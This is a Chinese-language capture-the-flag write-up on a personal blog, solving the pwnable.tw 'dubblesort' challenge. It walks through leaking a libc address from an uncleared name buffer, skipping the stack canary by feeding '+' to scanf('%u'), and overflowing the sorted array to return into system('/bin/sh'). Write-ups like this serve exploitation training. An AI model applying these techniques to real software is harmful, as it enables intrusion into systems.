<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    
    
    <link rel="shortcut icon" href="../../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>dubblesort - frozenkp's Blog</title>
    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "dubblesort", url: "#_top", children: [
              {title: "Observation", url: "#observation" },
              {title: "Solution", url: "#solution" },
              {title: "Note", url: "#note" },
          ]},
        ];

    </script>
    <script src="../../../../js/base.js"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../criticalheap/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../criticalheap/" class="btn btn-xs btn-link">
        criticalheap
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../hacknote/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../hacknote/" class="btn btn-xs btn-link">
        hacknote
      </a>
    </div>
    
  </div>

    

    <h1 id="dubblesort">dubblesort</h1>
<blockquote>
<p>Challenge link: <a href="https://pwnable.tw/challenge/#4">dubblesort</a></p>
<p>Category: pwn</p>
<p>Writeup: <a href="https://github.com/frozenkp/CTF/tree/master/others/pwnable.tw/dubblesort">dubblesort</a></p>
</blockquote>
<p>Sort the memory!</p>
<p><code>nc chall.pwnable.tw 10101</code></p>
<p><a href="https://pwnable.tw/static/chall/dubblesort">dubblesort</a></p>
<p><a href="https://pwnable.tw/static/libc/libc_32.so.6">libc.so</a></p>
<h2 id="observation">Observation</h2>
<p>一開始程式先問了<strong>名字</strong>，接著問要<strong>排列幾個數字</strong> ，最後依序輸入<strong>各個數字</strong>後會排列完輸出結果</p>
<p>看到這題時，我想到之前在 <code>csie.ctf.tw</code> 有寫過一題 bubblesort ，那題是透過排列的數字沒有限制數量來蓋到 return address，或許這題有類似的漏洞</p>
<div class="highlight"><pre><span></span><code>$ ./dubblesort
What your name :a
Hello a
,How many numbers <span class="k">do</span> you what to sort :3
Enter the <span class="m">0</span> number : <span class="m">0</span>
Enter the <span class="m">1</span> number : <span class="m">1</span>
Enter the <span class="m">2</span> number : <span class="m">2</span>
Processing......
Result :
<span class="m">0</span> <span class="m">1</span> <span class="m">2</span>
</code></pre></div>
<h3 id="file">file</h3>
<div class="highlight"><pre><span></span><code>$ file dubblesort
dubblesort: ELF <span class="m">32</span>-bit LSB shared object, Intel <span class="m">80386</span>, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.24, BuildID<span class="o">[</span>sha1<span class="o">]=</span>12a217baf7cbdf2bb5c344ff14adcf7703672fb1, stripped
</code></pre></div>
<h3 id="checksec">checksec</h3>
<p>保護全開</p>
<div class="highlight"><pre><span></span><code>gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
</code></pre></div>
<h3 id="input">input</h3>
<p>名字是使用 <code>read()</code> 來讀取，讀取的長度是 0x40</p>
<div class="highlight"><pre><span></span><code>   0x56555a11 &lt;main+78&gt;:    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x0
<span class="o">=</span>&gt; 0x56555a18 &lt;main+85&gt;:    call   0x56555630 &lt;read@plt&gt;
   0x56555a1d &lt;main+90&gt;:    mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,esi
Guessed arguments:
arg<span class="o">[</span><span class="m">0</span><span class="o">]</span>: 0x0
arg<span class="o">[</span><span class="m">1</span><span class="o">]</span>: 0xffffd72c --&gt; 0xff17
arg<span class="o">[</span><span class="m">2</span><span class="o">]</span>: 0x40 <span class="o">(</span><span class="s1">&#39;@&#39;</span><span class="o">)</span>
</code></pre></div>
<p>要排列的數量是使用 <code>scanf()</code> ，且參數是 <code>%u</code> 也就是 unsigned int</p>
<div class="highlight"><pre><span></span><code>   0x56555a45 &lt;main+130&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
<span class="o">=</span>&gt; 0x56555a48 &lt;main+133&gt;:   call   0x56555700 &lt;__isoc99_scanf@plt&gt;
   0x56555a4d &lt;main+138&gt;:   mov    eax,DWORD PTR <span class="o">[</span>esp+0x18<span class="o">]</span>
Guessed arguments:
arg<span class="o">[</span><span class="m">0</span><span class="o">]</span>: 0x56555bfa --&gt; 0x45007525 <span class="o">(</span><span class="s1">&#39;%u&#39;</span><span class="o">)</span>
arg<span class="o">[</span><span class="m">1</span><span class="o">]</span>: 0xffffd708 --&gt; 0xe0
</code></pre></div>
<p>接著數字的部分一樣是使用 <code>scanf()</code> 加上 <code>%u</code> </p>
<div class="highlight"><pre><span></span><code>   0x56555a92 &lt;main+207&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
<span class="o">=</span>&gt; 0x56555a95 &lt;main+210&gt;:   call   0x56555700 &lt;__isoc99_scanf@plt&gt;
   0x56555a9a &lt;main+215&gt;:   add    esi,0x1
Guessed arguments:
arg<span class="o">[</span><span class="m">0</span><span class="o">]</span>: 0x56555bfa --&gt; 0x45007525 <span class="o">(</span><span class="s1">&#39;%u&#39;</span><span class="o">)</span>
arg<span class="o">[</span><span class="m">1</span><span class="o">]</span>: 0xffffd70c --&gt; 0xf7f37f0a <span class="o">(</span>mov    edx,DWORD PTR <span class="o">[</span>esp+0x18<span class="o">])</span>
</code></pre></div>
<h3 id="sort">sort</h3>
<p>sort 的參數是 要排列的數量 以及 第一個數字在 stack 上的位址，排列的方式看起來沒什麼問題</p>
<div class="highlight"><pre><span></span><code>   0x56555ab0 &lt;main+237&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
<span class="o">=</span>&gt; 0x56555ab3 &lt;main+240&gt;:   call   0x56555931
   0x56555ab8 &lt;main+245&gt;:   lea    eax,<span class="o">[</span>ebx-0x138c<span class="o">]</span>
Guessed arguments:
arg<span class="o">[</span><span class="m">0</span><span class="o">]</span>: 0xffffd70c --&gt; 0x0
arg<span class="o">[</span><span class="m">1</span><span class="o">]</span>: 0x3
----------------------- stack -----------------------
<span class="m">0028</span><span class="p">|</span> 0xffffd70c --&gt; 0x0        <span class="c1"># num 0</span>
<span class="m">0032</span><span class="p">|</span> 0xffffd710 --&gt; 0x1        <span class="c1"># num 1</span>
<span class="m">0036</span><span class="p">|</span> 0xffffd714 --&gt; 0x2        <span class="c1"># num 2</span>
</code></pre></div>
<h3 id="name">name</h3>
<p>在測試 name 的時候，發現有時候會輸出一些不可視字元</p>
<div class="highlight"><pre><span></span><code>./dubblesort
What your name :aaaa
Hello aaaa
y��/,How many numbers <span class="k">do</span> you what to sort :
</code></pre></div>
<p>經過觀察後發現應該是因為 name 沒有將所有空間先歸零，所以輸出時才會連同後面的舊資料一起輸出</p>
<h3 id="stack-canary">stack canary</h3>
<p>因為有開 canary 的關係，就算沒有檢查最多可以輸入幾個數字，再輸入超過時依然會噴錯</p>
<div class="highlight"><pre><span></span><code>*** stack smashing detected ***: ./dubblesort terminated
</code></pre></div>
<p>利用二分搜的方式測試，發現最多只能輸入到 24 個數字，如果到第 25 個數字的話，在排列時就會噴出以上的錯誤訊息</p>
<h2 id="solution">Solution</h2>
<p>總共有三個步驟要做</p>
<ol>
<li>leak libc</li>
<li>bypass canary</li>
<li>ret2libc</li>
</ol>
<h3 id="leak-libc">Leak libc</h3>
<p>這邊我利用的是 name</p>
<p>因為 name 的 buffer 沒有先清空的關係，所以可以 leak 出後面的數值</p>
<div class="highlight"><pre><span></span><code><span class="m">0060</span><span class="p">|</span> 0xffffd72c <span class="o">(</span><span class="s2">&quot;aaaa\n\331\377\377/&quot;</span><span class="o">)</span>
<span class="m">0064</span><span class="p">|</span> 0xffffd730 --&gt; 0xffffd90a --&gt; 0xfb6d2200
<span class="m">0068</span><span class="p">|</span> 0xffffd734 --&gt; 0x2f <span class="o">(</span><span class="s1">&#39;/&#39;</span><span class="o">)</span>
<span class="m">0072</span><span class="p">|</span> 0xffffd738 --&gt; 0x8e
<span class="m">0076</span><span class="p">|</span> 0xffffd73c --&gt; 0x16
<span class="m">0080</span><span class="p">|</span> 0xffffd740 --&gt; 0x8000
<span class="m">0084</span><span class="p">|</span> 0xffffd744 --&gt; 0xf7fcb000 --&gt; 0x1b1db0
<span class="m">0088</span><span class="p">|</span> 0xffffd748 --&gt; 0xf7fc9244 --&gt; 0xf7e31020 <span class="o">(</span>call   0xf7f38b59<span class="o">)</span>    &lt;<span class="o">==</span>
</code></pre></div>
<p>由上面 stack 內容可知，第 8 個包含一個位址，可以記錄下此時 libc base 與其之間的差值，並在真正 leak 出此值時減掉差值，即可得到 libc base</p>
<div class="highlight"><pre><span></span><code>0xf7fc9244 - <span class="nv">libc_base</span> <span class="o">=</span> x <span class="o">(</span>固定的<span class="o">)</span>
leak_addr - <span class="nv">x</span> <span class="o">=</span> libc_base
</code></pre></div>
<p>只要輸入 28 (4*7) 個字元作為 payload ，就可以印出這個位址的值了</p>
<div class="highlight"><pre><span></span><code><span class="m">0060</span><span class="p">|</span> 0xffffd72c <span class="o">(</span><span class="s1">&#39;a&#39;</span> &lt;repeats <span class="m">28</span> times&gt;, <span class="s2">&quot;\n\222\374\367\001VUV\251WUV\240oUV\001&quot;</span><span class="o">)</span>
<span class="m">0064</span><span class="p">|</span> 0xffffd730 <span class="o">(</span><span class="s1">&#39;a&#39;</span> &lt;repeats <span class="m">24</span> times&gt;, <span class="s2">&quot;\n\222\374\367\001VUV\251WUV\240oUV\001&quot;</span><span class="o">)</span>
<span class="m">0068</span><span class="p">|</span> 0xffffd734 <span class="o">(</span><span class="s1">&#39;a&#39;</span> &lt;repeats <span class="m">20</span> times&gt;, <span class="s2">&quot;\n\222\374\367\001VUV\251WUV\240oUV\001&quot;</span><span class="o">)</span>
<span class="m">0072</span><span class="p">|</span> 0xffffd738 <span class="o">(</span><span class="s1">&#39;a&#39;</span> &lt;repeats <span class="m">16</span> times&gt;, <span class="s2">&quot;\n\222\374\367\001VUV\251WUV\240oUV\001&quot;</span><span class="o">)</span>
<span class="m">0076</span><span class="p">|</span> 0xffffd73c <span class="o">(</span><span class="s1">&#39;a&#39;</span> &lt;repeats <span class="m">12</span> times&gt;, <span class="s2">&quot;\n\222\374\367\001VUV\251WUV\240oUV\001&quot;</span><span class="o">)</span>
<span class="m">0080</span><span class="p">|</span> 0xffffd740 <span class="o">(</span><span class="s2">&quot;aaaaaaaa\n\222\374\367\001VUV\251WUV\240oUV\001&quot;</span><span class="o">)</span>
<span class="m">0084</span><span class="p">|</span> 0xffffd744 <span class="o">(</span><span class="s2">&quot;aaaa\n\222\374\367\001VUV\251WUV\240oUV\001&quot;</span><span class="o">)</span>
<span class="m">0088</span><span class="p">|</span> 0xffffd748 --&gt; 0xf7fc920a --&gt; 0x0
</code></pre></div>
<h3 id="bypass-canary">bypass canary</h3>
<p>在 observation 時，有利用二分搜的方式找到 canary 的位置在第 25 個</p>
<p>此時可以利用輸入時的 <code>scanf("%u")</code> ，一般在輸入時，要輸入 unsigned int 才會被接受，但是這樣會蓋掉 canary ，經過搜尋後才知道，原來可以輸入 '+'，此時會被當作正常輸入，但保留此位置原始的值，直接跳到下一個，如此一來就可直接繞過 canary 了</p>
<h3 id="ret2libc">ret2libc</h3>
<p>要做到 ret2libc 的話達成兩個條件</p>
<ul>
<li>libc base</li>
<li>return address</li>
</ul>
<p>libc base 在先前已經透過 name 取得了，想要控制 return address 的話，可以利用輸入數字時的 buffer overflow，因為已經跳過 canary 了，所以可以一直推到 return 的位置，並進而控制 return address</p>
<p>這邊我一樣用二分搜的方式來做，如果有蓋到 return address 的位置的話會出現以下訊息</p>
<div class="highlight"><pre><span></span><code><span class="o">[</span>*<span class="o">]</span> Process <span class="s1">&#39;./dubblesort&#39;</span> stopped with <span class="nb">exit</span> code -11 <span class="o">(</span>SIGSEGV<span class="o">)</span> <span class="o">(</span>pid <span class="m">2290</span><span class="o">)</span>
</code></pre></div>
<p>搜尋過後知道 return address 是在第 33 個位置</p>
<div class="highlight"><pre><span></span><code><span class="m">24</span><span class="o">(</span>payload<span class="o">)</span> + canary + <span class="m">7</span> + ret
</code></pre></div>
<p>最後就是使用 libc base 找到 <code>system</code> 以及 <code>/bin/sh</code> 串接在 return address 的位置即可</p>
<h2 id="note">Note</h2>
<h3 id="pwntool-libc">pwntool libc</h3>
<p>因為有給 libc ，所以在本機測試時最好是掛上 libc ，否則位址可能會跟遠端不同</p>
<div class="highlight"><pre><span></span><code><span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./dubblesort&#39;</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;LD_PRELOAD&#39;</span><span class="p">:</span><span class="s1">&#39;./libc_32.so.6&#39;</span><span class="p">})</span>
</code></pre></div>
<h3 id="sort_1">sort</h3>
<p>在輸入 payload 時，因為輸入完後還會進行排序，所以要確保排序過後順序依然不變</p>
<p>我的作法是前 24 個字就直接輸入 0~23 ，canary 的部分輸入 + (43)，接著後面的 7 個字放 libc base，最後 <code>system</code> 及 <code>/bin/sh</code> 因為要加上 libc base ，所以一定比 libc base 大</p>
<h3 id="system">system</h3>
<p>在呼叫 system 時，stack 第一個位置是結束後的 return address，因為不會 return 了，所以隨便填就可以了，接著才是 system 的第一個參數 <code>/bin/sh</code> </p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../criticalheap/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../criticalheap/" class="btn btn-xs btn-link">
        criticalheap
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../hacknote/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../hacknote/" class="btn btn-xs btn-link">
        hacknote
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="container-fluid wm-page-content">
      <p>
        <a href="https://github.com/frozenkp/frozenkp.github.io/edit/master/docs/Writeups/Others/pwnable.tw/dubblesort.md">Edit on frozenkp/frozenkp</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
</footer>

</body>
</html>